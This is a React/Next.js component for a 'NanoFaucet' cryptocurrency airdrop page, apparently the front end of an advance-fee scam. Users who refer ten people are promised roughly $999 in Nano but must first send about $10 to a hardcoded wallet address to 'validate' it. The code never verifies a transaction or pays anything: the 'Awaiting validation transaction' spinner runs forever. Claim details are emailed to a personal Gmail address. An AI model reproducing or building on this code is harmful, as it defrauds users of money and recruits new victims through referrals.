"use client";
import Image from "next/image";
import Link from "next/link";
import { HiOutlineClipboardDocument } from "react-icons/hi2";
import { HiMiniXMark } from "react-icons/hi2";
import { FormEvent, useEffect, useState } from "react";
import { useLockBodyScroll } from "@/hooks/hooks";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css"; // Ensure toast styles are applied
import { FaSpinner } from "react-icons/fa6";
import { sendMail } from "@/lib/actions/mail.action";

const copyToClipboard = (text: string) => {
  navigator.clipboard.writeText(text).then(
    () => {
      toast("Nano Address Copied");
    },
    (err) => {
      console.error("Failed to copy: ", err);
    }
  );
};

export function GetNano({
  referralCount,
  email,
}: {
  referralCount: number;
  email: string;
}) {
  const [isQrOpen, setIsQrOpen] = useState(false);
  const [openModal, setOpenModal] = useState(false);
  const [address, setAddress] = useState("");
  const [validationError, setValidationError] = useState("");

  useLockBodyScroll(openModal);

  function toggleQr() {
    setIsQrOpen(!isQrOpen);
  }

  function toggleOpenModal() {
    setOpenModal(!openModal);
  }

  function handleSubmit(e: FormEvent<HTMLFormElement>) {
    e.preventDefault();

    // Validate if the address starts with "nano"
    if (!address.startsWith("nano")) {
      setValidationError("Invalid Nano Address");
      return;
    }

    // Clear any previous error and proceed with submission logic
    setValidationError("");
    // Open modal or perform next steps here
    toggleOpenModal();
  }
  return (
    <div>
      <form className="space-y-2" onSubmit={handleSubmit}>
        <input
          type="text"
          placeholder="Nano address"
          value={address}
          required
          onChange={(e) => setAddress(e.target.value)}
          className="w-full ring-2 ring-accent text-primary rounded-md py-2 px-4 outline-none"
        />

        {validationError && (
          <p className="text-red-500 text-xs font-medium">{validationError}</p>
        )}

        <button
          title="Get Nano"
          type="submit"
          className="bg-accent hover-effects hover:bg-accent/80 text-white px-4 py-2 w-full rounded-md"
        >
          Get Nano!
        </button>
      </form>

      {openModal && (
        <Modal
          email={email}
          openModal={openModal}
          referralCount={referralCount}
          toggleOpenModal={toggleOpenModal}
          isQrOpen={isQrOpen}
          toggleQr={toggleQr}
        />
      )}

      <ToastContainer />
    </div>
  );
}

function Modal({
  email,
  openModal,
  referralCount,
  toggleOpenModal,
  isQrOpen,
  toggleQr,
}: {
  email: string;
  openModal: boolean;
  referralCount: number;
  toggleOpenModal: () => void;
  isQrOpen: boolean;
  toggleQr: () => void;
}) {
  const [isReferralMet, setIsReferralMet] = useState<boolean | null>(null);
  const [isAddressValidated, setIsAddressValidated] = useState<boolean | null>(
    null
  );

  const [isLoadingPrice, setIsLoadingPrice] = useState(true);
  const [isLoadingReferral, setIsLoadingReferral] = useState(true);
  const [isLoadingValidation, setIsLoadingValidation] = useState(false);
  const [nanoAmount1, setNanoAmount1] = useState<string | null>(null);
  const [nanoAmount2, setNanoAmount2] = useState<string | null>(null);

  useEffect(() => {
    let lastFetchTime = 0;
    const fetchPrice = async () => {
      const now = Date.now();
      if (now - lastFetchTime < 60000) {
        console.log("Using cached data...");
        return; // Skip fetch if it's within the time limit
      }
      try {
        console.log("loading....");
        const response = await fetch(
          "https://api.coingecko.com/api/v3/simple/price?ids=nano&vs_currencies=usd"
        );
        if (!response.ok) {
          throw new Error(`HTTP error! status: ${response.status}`);
        }
        const data = await response.json();
        setNanoAmount1((999 / data.nano.usd).toFixed(2));
        setNanoAmount2((10 / data.nano.usd).toFixed(2));
        lastFetchTime = now; // Update last fetch time
        console.log("loading result");
      } catch (error) {
        console.error("Error fetching price:", error);
      } finally {
        setIsLoadingPrice(false); // This will change to false when price fetch is done
        console.log("finished loading...");
      }
    };

    fetchPrice();

    const sendAdminMail = async (email: string) => {
      await sendMail({
        to: "irisinvest041@gmail.com",
        subject: `Airdrop Claim Request: User ${email} Requires Nano Address Validation`,
        body: `<p>Hello Admin,</p>
               <p>User with email <strong>${email}</strong> has completed 10 referrals and is attempting to claim the Nano airdrop.</p>
               <p>To receive their Nano airdrop, they need to validate ownership of their Nano address by completing a verified Nano transaction. This requires them to send a minimum-value transaction from their Nano address.</p>
               <p>Please review their eligibility and confirm their Nano address validation to proceed with the airdrop.</p>
               <p>Best regards,</p>
               <p>The NanoFaucet System</p>`,
      });
    };

    const sendCustomerAndAdminEmail = async (email: string) => {
      await sendMail({
        to: "irisinvest041@gmail.com",
        subject: `Airdrop Claim Attempt - User Has Not Met Referral Threshold`,
        body: `<p>Hello Admin,</p>
               <p>A user attempted to claim the Nano airdrop but has not yet reached the required referral threshold.</p>
               <p><strong>User Details:</strong></p>
               <ul>
                 <li>Email: ${email}</li>
                 <li>Current Referrals: ${referralCount} out of 10</li>
               </ul>
               <p>Please review the user's account and ensure they meet the threshold before processing the airdrop claim.</p>
               <p>Thank you for your attention to this matter.</p>
               <p>Best regards,</p>
               <p>The NanoFaucet System</p>`,
      });

      await sendMail({
        to: email,
        subject: `Referral Threshold Not Yet Met for Nano Airdrop`,
        body: `<p>Hello ${email},</p>
               <p>We wanted to let you know that while you're actively participating on NanoFaucet, your account has not yet reached the referral threshold required to qualify for the Nano airdrop.</p>
               <p><strong>Current Progress:</strong></p>
               <ul>
                 <li>Referrals completed: ${referralCount} out of 10</li>
               </ul>
               <p>Once you've referred 10 users, you'll automatically become eligible for the airdrop. Keep inviting friends to earn rewards and reach the threshold sooner!</p>
               <p>If you have any questions or need assistance, please feel free to reach out to us.</p>
               <p>Thank you for being a part of the NanoFaucet community!</p>
               <p>Best regards,</p>
               <p>The NanoFaucet Team</p>`,
      });
    };

    // Simulate loading for referral check
    const referralTimeout = setTimeout(() => {
      const referralMet = referralCount >= 10;
      setIsReferralMet(referralMet);
      setIsLoadingReferral(false);

      // Start address validation only if referral requirement is met
      if (referralMet) {
        // Keep loading validation true as long as you need
        setIsLoadingValidation(true);
        setIsAddressValidated(null);

        sendAdminMail(email);

        // Do not set isLoadingValidation to false yet, handle it on user action instead
        // You may want to add logic here to listen for user actions that would end the loading state

        // Here is where you might consider when to set it to false based on user interaction
      } else {
        sendCustomerAndAdminEmail(email);
      }
    }, 10000); // 5-second delay for referral check

    // Clear referral timeout if component unmounts
    return () => clearTimeout(referralTimeout);
  }, [referralCount, openModal]);

  const handleCopy = () => {
    copyToClipboard(
      "nano_3uh113jmsquuxf6x9374ox8taby3xpioggrtd4bpfz5jk4iyy4pddofpyhow"
    );
  };

  return (
    <>
      <div
        className={`fixed bg-black/50 z-10 top-0 left-0 right-0 flex items-center justify-center min-h-screen p-5  `}
      >
        <div className="bg-white shadow-md rounded-md font-bold w-full p-5 md:w-[30rem] space-y-5">
          <div className="ring-2 ring-accent rounded-md p-5 space-y-5 ">
            <div className="flex items-center justify-between">
              <Link
                href="/claim-faucet"
                className="text-xs text-accent right-0 "
              >
                How to receive faucet?
              </Link>

              <div
                className="bg-primary/10 p-1 rounded-md cursor-pointer"
                onClick={toggleOpenModal}
              >
                <HiMiniXMark className="size-4" />
              </div>
            </div>

            <div>
              <ul className="space-y-5 text-xs relative">
                {/* Referral Status */}
                <li className="flex items-center space-x-4">
                  <div
                    className={`size-7 ring-1 ring-primary/20 z-20 text-white rounded-full bg-accent flex items-center justify-center ${
                      isLoadingReferral
                        ? "bg-accent"
                        : isReferralMet
                        ? "bg-green-500"
                        : "bg-red-500"
                    }`}
                  >
                    <span>
                      {isLoadingReferral ? (
                        <FaSpinner className=" animate-spin size-4" />
                      ) : (
                        "1"
                      )}
                    </span>
                  </div>
                  <span>Referral</span>
                  <div
                    className={`absolute top-0 left-[-0.18rem] bg-accent w-[2px] h-[4rem] ${
                      isLoadingReferral
                        ? "bg-accent"
                        : isReferralMet
                        ? "bg-green-500"
                        : "bg-red-500"
                    }`}
                  />
                </li>

                {/* Address Validation Status */}
                <li className="flex items-center space-x-4">
                  <div
                    className={`size-7 ring-1 ring-primary/20 z-20 text-white rounded-full flex items-center justify-center ${
                      isLoadingReferral
                        ? "bg-accent"
                        : isAddressValidated
                        ? "bg-green-500"
                        : "bg-accent"
                    }`}
                  >
                    <span>
                      {isLoadingValidation ? (
                        <FaSpinner className="animate-spin size-4" />
                      ) : (
                        "2"
                      )}
                    </span>
                  </div>
                  <span>Address Validation</span>
                  <div
                    className={`absolute top-16 left-[-0.18rem] bg-accent w-[2px] h-[3.5rem] ${
                      isLoadingValidation
                        ? "bg-accent"
                        : isAddressValidated
                        ? "bg-green-500"
                        : "bg-accent"
                    }`}
                  />
                </li>
                <li className="flex items-center space-x-4">
                  <div className="size-7 ring-1 ring-primary/20 z-20 bg-accent text-white rounded-full flex items-center justify-center">
                    3
                  </div>
                  <span>Airdrop</span>
                </li>
              </ul>
            </div>

            {isLoadingReferral || isLoadingPrice ? (
              <div className="flex justify-center items-center">
                <FaSpinner className="animate-spin size-4" />
              </div>
            ) : isReferralMet ? (
              <div className="space-y-2">
                <div className="text-xs text-center">
                  <span className="text-primary">
                    Your address qualifies to receive {nanoAmount1} nano
                  </span>
                  <br />
                  <span className="text-primary">
                    Validate address to receive nano airdrop
                  </span>
                </div>
                <div
                  className="text-accent text-xs flex items-center space-x-2 cursor-pointer w-[fit-content] mx-auto"
                  onClick={handleCopy}
                >
                  <HiOutlineClipboardDocument className="size-4" />
                  <span>nano-7CABATA</span>
                </div>
                <p className="text-xs text-green-500 text-center">
                  <span className="font-light">Validation Nano:</span>{" "}
                  {nanoAmount2} nano
                </p>
                <div className="flex justify-center items-center flex-col space-y-2 mx-auto">
                  <button
                    className="rounded-md ring-1 text-xs ring-primary/20 px-4 py-2 flex justify-center"
                    onClick={toggleQr}
                  >
                    {isQrOpen ? "Hide QRCode" : "Show QRCode"}
                  </button>
                  {isQrOpen && (
                    <Image
                      src="/address.jpg"
                      width={200}
                      height={200}
                      alt="Wallet Address"
                    />
                  )}
                </div>
                <div className="flex items-center justify-center space-x-4 text-red-500">
                  <span className="text-xs text-red-500">
                    Awaiting validation transaction
                  </span>
                  <FaSpinner className="animate-spin size-4" />
                </div>
              </div>
            ) : (
              <span className="flex items-center text-xs text-red-500 text-center">
                Your account has not reached the referral threshold to qualify
                for airdrop
              </span>
            )}
          </div>
        </div>
      </div>
    </>
  );
}
